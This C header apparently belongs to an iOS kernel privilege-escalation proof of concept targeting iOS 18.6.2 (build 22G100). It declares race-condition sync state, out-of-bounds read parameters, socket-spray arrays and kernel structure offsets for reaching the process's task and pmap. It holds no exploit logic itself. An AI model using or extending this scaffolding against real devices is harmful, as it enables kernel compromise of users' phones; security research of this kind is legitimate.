#ifndef common_h
#define common_h

#include <IOSurface/IOSurfaceRef.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/syslimits.h>
#include <sys/uio.h>

typedef void (*poc_log_handler_t)(const char* line);

void poc_set_log_handler(poc_log_handler_t handler);
void poc_log(const char* prefix, const char* format, ...) __attribute__((format(printf, 2, 3)));

#define LOG(fmt, ...) poc_log("[i] ", fmt, ##__VA_ARGS__)
#define LOG_ERR(fmt, ...) poc_log("[err] ", fmt, ##__VA_ARGS__)

#ifdef DEBUG
#define LOG_DEBUG(fmt, ...) poc_log("[debug] ", fmt, ##__VA_ARGS__)
#else
#define LOG_DEBUG(fmt, ...)
#endif

#define MAX_SOCKETS_COUNT 0x5800
#define TARGET_VERSION "18.6.2"
#define TARGET_BUILD "22G100"

kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t* address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t* address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

typedef struct free_thread_shared {
    _Atomic uint64_t free_thread_start;
    _Atomic uint64_t free_target_sync;
    _Atomic uint64_t free_target_size_sync;
    _Atomic uint64_t target_object_sync;
    _Atomic uint64_t target_object_offset_sync;
    _Atomic uint64_t go_sync;
    _Atomic uint64_t race_sync;
    _Atomic uint64_t stop_sync;
    _Atomic uint64_t map_error;
} free_thread_shared_t;

typedef struct mlock_surfaces {
    mach_vm_address_t address;
    IOSurfaceRef surface;
} mlock_surfaces_t;

typedef struct offsets {
    uint64_t inpcb_icmp6filt;
    uint64_t inpcb_inp_list_le_next;
    uint64_t inpcb_inp_pcbinfo;
    uint64_t inpcb_inp_socket;
    uint64_t socket_so_count;
    uint64_t socket_so_background_thread;
    uint64_t thread_t_ro;
    uint64_t thread_ro_proc;
    uint64_t proc_p_ro;
    uint64_t proc_ro_task;
    uint64_t task_map;
    uint64_t map_pmap;
} offsets_t;
extern offsets_t g_offsets;

typedef struct pe_context {
    offsets_t offsets;

    char device_machine[256];
    char* executable_name;  // oracle
    char read_file_path[PATH_MAX];
    char write_file_path[PATH_MAX];

    size_t target_file_size;
    uint64_t oob_offset;
    uint64_t oob_size;
    uint64_t n_of_oob_pages;

    mach_vm_address_t pc_address;
    mach_vm_size_t pc_size;
    mach_port_t pc_object;
    mach_vm_address_t free_target;
    mach_vm_size_t free_target_size;

    int write_fd;
    int read_fd;

    uint64_t random_marker;
    uint64_t wired_page_marker;

    free_thread_shared_t* shared;
    pthread_t free_thread;
    bool free_thread_started;

    struct iovec iov;
    uint64_t highiest_success_idx;
    uint64_t success_read_count;
    uint64_t oob_race_max_tries;
    bool race_failed;

    int control_socket;
    int rw_socket;
    uint64_t control_socket_pcb;
    uint64_t rw_socket_pcb;
    uint8_t rw_filter_snapshot[0x20];
    bool filter_snapshots_valid;
    bool transport_unsafe;

    uint8_t* default_file_content;

    uint64_t kernel_base;
    uint64_t kernel_slide;
    uint64_t self_proc;
    uint64_t self_task;
    uint64_t self_pmap;

    mach_port_t socket_ports[MAX_SOCKETS_COUNT];  // save output mach port from fileport_makeport
    uint64_t socket_pcb_ids[MAX_SOCKETS_COUNT];   // save pcb gencnt on this array
    size_t socket_ports_count;

    mlock_surfaces_t* mlock_surfaces;
    size_t mlock_surfaces_count;
    size_t mlock_surfaces_capacity;
} pe_context_t;
extern pe_context_t g_ctx;

#endif /* common_h */
